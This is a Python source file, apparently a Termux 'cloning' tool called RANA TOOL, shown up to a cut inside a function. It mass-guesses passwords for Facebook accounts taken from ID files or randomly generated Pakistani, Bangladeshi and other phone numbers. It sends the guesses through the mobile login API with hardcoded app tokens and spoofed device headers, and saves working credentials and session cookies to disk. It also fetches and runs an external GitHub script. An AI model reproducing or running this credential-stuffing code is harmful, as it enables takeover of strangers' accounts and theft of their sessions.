
"""
MR-XXX

"""
#<<_________[ IMPORTING MODULES ]_________>>#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
import marshal
import os,base64
from os import system as clr
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO RANA TOOL ðŸŒ·...')
os.system('espeak -a 300 " Wellcome,   To,  ,raana ,Tool,"')
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
#<<_________[ COLOR ]_________>>#
W = '\033[97;1m' 
B = '\033[96;1m'
P = '\033[95;1m' 
R = '\033[91;1m' 
G = '\033[92;1m'
#####_____Folder-Setup_____#####
try:
	os.makedirs('/sdcard/RANA')
except:
		pass
sys.stdout.write('\x1b]2;RANA-G\x07')
#<<_________[ LOGO ]_________>>#
logo = (f"""
  {R}MMM.MMq.        db      `7MN.   `7MF'     db
  {R}MM   `MM.      ;MM:       MMN.    M      ;MM:
  {W}MM   ,M9      ,V^MM.      M YMb   M     ,V^MM.
  {W}MMmmdM9      ,M  `MM      M  `MN. M    ,M  `MM
  {R}MM  YM.      AbmmmqMA     M   `MM.M    AbmmmqMA
  {R}MM   `Mb.   A'     VML    M     YMM   A'     VML
  {R}MML. .JMM..AMA.   .AMMA..JML.    YM .AMA.   .AMMA
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{R} OWNER   {R}:{R} RANA NADEEM RAJPUT
{W} [{R}+{W}]{W} FB ID   {R}:{W} ITXRANA.5214
{W} [{R}+{W}]{W} WHATSAP {R}:{W} 03082503426
{W} [{R}+{W}]{R} STATUS  {R}:{R} FREE
{W} [{R}+{W}]{R} VERSION {R}:{R} NEW
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{W}
{W} [{R}+{W}]{W}            \033[1;41m\033[1;37m[WELLCOME TO \033[1;42m\033[1;37mRANA TOOL]\x1b[0m
{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>""")
#<<_________[ LINE ]_________>>#
#<<_________[ LOOP ]_________>>#
loop=0
twf=[]
oks=[]
cps=[]
ok=[]
cp=[]
pcp=[]
id=[]
tokenku=[]
#########Lines#######
def line():
	print(f"{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>++<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>")
#<<_________[ CLEAR ]_________>>#
def clear():
	os.system(f'clear')
	print(logo)
#<<_________[ MAIN MENU ]_________>>#
def menu():
			clear()
			#os.system('espeak -a 300 " Main     ,Menu, "')
			print(f"{W} [{R}+{W}]                  {G}MAIN  MENU{W}")
			line()
			print(f"{W} [{R}1{W}] {W}FILE CLONING")
			print(f"{W} [{R}2{W}] {W}FILE CREATE MENU")
			print(f"{W} [{R}3{W}] {W}RANDOM NUM CLONING")
			print(f"{W} [{R}4{W}] {W}SEPRATE LINKS FROM FILE")
			print(f"{W} [{R}5{W}] {W}CUT USED LINKS FROM FILE")
			print(f"{W} [{R}6{W}] {W}REMOVE DOUBLE LINKS FROM FILE ")
			print(f"{W} [{R}7{W}] {W}UNBLOCK YOUR IP ADRESS TRY TO UNLOCK")
			print(f"{W} [{R}0{W}] {R}EXIT FROM RANA TOOL {W}[{R}X{W}] {W}")
			line()
			line()
			xd=input(f'{W} [{R}+{W}] CHOSE: ')
			if xd in ['1','01']:
				clear()
				print(f'{W} [{R}+{W}] EXAMPLE:  /sdcard/File.txt  etc..')
				#os.system('espeak -a 300 " Enter,   File,  , Name,"')
				line()
				file = input(f'{W} [{R}+{W}] PUT FILE\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(f'{W} [{R}+{W}] FILE NOT FOUND ')
					#os.system('espeak -a 300 " wrong,   File,  , Name,"')
					time.sleep(1)
					menu()
				clear()
				print(f'{W} [{R}+{W}]{G}                  METHOD MENU ')
				line()
				#os.system('espeak -a 300 " Select, Method,"')
				print(f'{W} [{R}1{W}] METHOD 1  {W}[{G}FOR NEW IDS{W}]')
				print(f'{W} [{R}2{W}] METHOD 2  {W}[{G}FOR MIX IDS{W}]')
				print(f'{W} [{R}3{W}] METHOD 3  {W}[{G}FOR MIX IDS{W}]')
				print(f'{W} [{R}4{W}] METHOD 4  {W}[{G}FOR MIX IDS{W}]')
				line()
				mthd=input(f'{W} [{R}+{W}] CHOSE: ')
				line()
				plist = []
				try:
					#os.system('espeak -a 300 " Put,   Password,  ,Limit,"')
					ps_limit = int(input(f'{W} [{R}+{W}] PASS LIMIT : '))
				except:
					ps_limit =1
				clear()
				print(f'{W} [{R}+{W}] EXP: first last,firtslast,first123')
				line()
				for i in range(ps_limit):
					plist.append(input(f'{W} [{R}+{W}] PUT PASS {i+1}: '))
				clear()
				print(f'{W} [{R}+{W}] DO YOU WANT TO SHOW CP IDS ? (y/n): ')
				line()
				cx=input(f'{W} [{R}+{W}] CHOSE: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=50) as crack_submit:
					clear()
					total_ids = str(len(fo))
					#os.system('espeak -a 300 " Process,   will  be,   Started,    ,Please  Wait,"')
					print(f'{W} [{R}+{W}] TOTAL FILE ACCOUNTS : \033[1;32m'+total_ids+f' ')
					print(f'{W} [{R}+{W}] PROCESS START PLEASE WAIT.....')
					print(f'{W} [{R}+{W}]{R} USE FLIGHT MODE AFTER EVERY 2 MINUTS')
					line()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(ffb2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(ffb3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(ffb4,ids,names,passlist)
				print(f'\033[1;37m')
				line()
				#os.system('espeak -a 300 " Process,   ,Completed,"')
				print(f'{W} [{R}+{W}] PROCESS COMPLTED')
				print(f"{W} [{R}+{W}] {W} OK IDZ : {G}%s "%(len(oks)))
				print(f"{W} [{R}+{W}] {W} CP IDZ : {R}%s "%(len(cps)))
				line()
				input(f'{W} [{R}+{W}] PRESS ENTER TO BACK ')
				menu()
			elif xd in ['2','02']:
				Create_menu()
			elif xd in ['3','03']:
				Main_Menu()
			elif xd in ['4','04']:
				with_names()
			elif xd in ['5','05']:
				used_cutter()
			elif xd in ['6','06']:
				remove_links()
			elif xd in ['7','07']:
				ipMain()
			elif xd in ['0','00']:
				exit(f'{W} [{R}+{W}] Thanks For Use ')
			else:
				exit(f'{W} [{R}+{W}] Option not found in menu...')
#<<_________[ METHOD 1 ]_________>>#
def ffb1(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RANA{W}]{R} %s{W} | {R}M1 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        #a1 = random.choice(prox)
                        #proxs= {'http': 'socks4://'+a1}
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'cpl': 'true',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'device_based_login_password',
'error_detail_type': 'button_with_disabled',
'source': 'register_api',
'email': ids,
'password': pas,
'access_token': '275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'generate_session_cookies': '1',
'meta_inf_fbmeta': 'NO_FILE',
'advertiser_id': str(uuid.uuid4()),
'currently_logged_in_userid': '0',
'locale': code1,
'client_country_code': loc1,
'method': 'auth.login',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '1d2d2c81b7ac43af4db39465bf23e77e'}
                        headers = {'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af',
'X-FB-Net-HNI': '20083',
'User-Agent': "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",
'X-FB-Client-IP': 'True',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-SIM-HNI': '37460',
'X-Tigon-Is-Retry': 'False',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Connection-Quality': 'MOBILE.LTE',
'X-FB-Server-Cluster': 'True',
'Connection': 'keep-alive',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Host': 'graph.facebook.com',
'X-FB-Connection-Bandwidth': '80025933',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'Accept-Encoding': 'gzip, deflate',
'X-FB-Connection-Type': 'MOBILE.LTE',
'Content-Type': 'application/x-www-form-urlencoded'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [RANA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' Cookie: \033[1;32m'+cookies)
                                        open('/sdcard/RANA/RANA-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/RANA/RANA-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [RANA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANA/RANA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)
#<<_________[ METHOD 2 ]_________>>#
def ffb2(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RANA{W}]{R} %s{W} | {R}M2 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": code2,"client_country_code": loc2,"method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]","X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [RANA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOKIES: \033[1;32m'+cookies)
                                        open('/sdcard/RANA/RANA-M2-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/RANA/RANA-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [RANA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANA/RANA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)
#<<_________[ METHOD 3 ]_________>>#
def ffb3(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RANA{W}]{R} %s{W} | {R}M3 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code3,'client_country_code': loc3,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers = {'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '847'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [RANA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOKIES: \033[1;32m'+cookies)
                                        open('/sdcard/RANA/RANA-M3-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/RANA/RANA-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [RANA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANA/RANA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)        	
#<<_________[ METHOD 4 ]_________>>#
def ffb4(ids,names,passlist):
        try:
                global oks,cps,loop
                sys.stdout.write(f'\r\r{W} [{R}RANA{W}]{R} %s{W} | {R}M4 \033[1;92mOK/{R}CP{W} %s/%s {W}'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                        data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': code4,'client_country_code': loc4,'fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers={'Host': 'graph.facebook.com','Content-Type': 'application/x-www-form-urlencoded','Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive','Priority': 'u=3, i','X-Fb-Sim-Hni': '45204','X-Fb-Net-Hni': '45201','X-Fb-Connection-Quality': 'GOOD','Zero-Rated': '0','User-Agent': "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_US;FBCA/arm64-v8a:;FBCR/Ufone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]",'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-Fb-Connection-Bandwidth': '24807555','X-Fb-Connection-Type': 'MOBILE.LTE','X-Fb-Device-Group': '5120','X-Tigon-Is-Retry': 'False','X-Fb-Friendly-Name': 'authenticate','X-Fb-Request-Analytics-Tags': 'unknown','X-Fb-Http-Engine': 'Liger','X-Fb-Client-Ip': 'True','X-Fb-Server-Cluster': 'True','Content-Length': '22'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G} [RANA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        #os.system('espeak -a 300 " Crack,   Successfully,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        #print(f' COOLIES: \033[1;32m'+cookies)
                                        open('/sdcard/RANA/RANA-M4-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/RANA/RANA-M4-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R} [RANA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RANA/RANA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
        	time.sleep(20)
        except Exception as e:
        	time.sleep(20)
####FILE CREAT MENU###
def Create_menu():
	clear()
	#os.system('espeak -a 300 " Wellcome, To,  File,  , Menu,"')
	print(f'{W} [{R}1{W}] {W}CREATE FILE BY RANA TOOL ')
	print(f'{W} [{R}2{W}] {W}CREATE FILE BY HANNAN TOOL ')
	print(f'{W} [{R}0{W}] {W}BACK MAIN MENU ')
	line()
	option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
	if option in ['1','01']:
		os.system('python Extract.py')
	if option in ['2','02']:
		Create_M2()
	if option in ['0','00']:
		menu()()
	else:
		line()
	print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
	time.sleep(2)
	Create_menu()
#####____Create-File-M1____#####

#####____Create-File-M2____#####
def Create_M2():
		os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
		os.system('cd && cd FILE ;python V33.py')
######RANDOM CLONE###
def Main_Menu():
    clear()
    print(f'{W} [{R}1{W}] {W}PAK CLONING\n{W} [{R}2{W}] {W}BD CLONING\n{W} [{R}3{W}] {W}AFG CLONING\n{W} [{R}4{W}] {W}INDIA CLONING\n{W} [{R}0{W}] {W}BACK MENU')
    #os.system('espeak -a 300 " Random,  Cloning, Menu,"')
    line()
    option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
    if option in ['1','01']:
        pak()
    if option in ['2','02']:
        bd()
    if option in ['3','03']:
        afg()
    if option in ['4','04']:
        ind()
    if option in ['0','00']:
    	menu()
    else:
    	line()
    print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
    time.sleep(2)
    Main_Menu()
#####____Random-Method-Setup____#####
def pak():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 0300,0315,0333,0345')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as ranag1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,'khan khan','khan1122','khan786','khankhan','malik123','kingkhan','baloch123','pak123','khan123','janjan','ali123','pakistan','pakistan786']
                                ranag1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                menu()
def bd():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 017,016,018')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as ranag1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
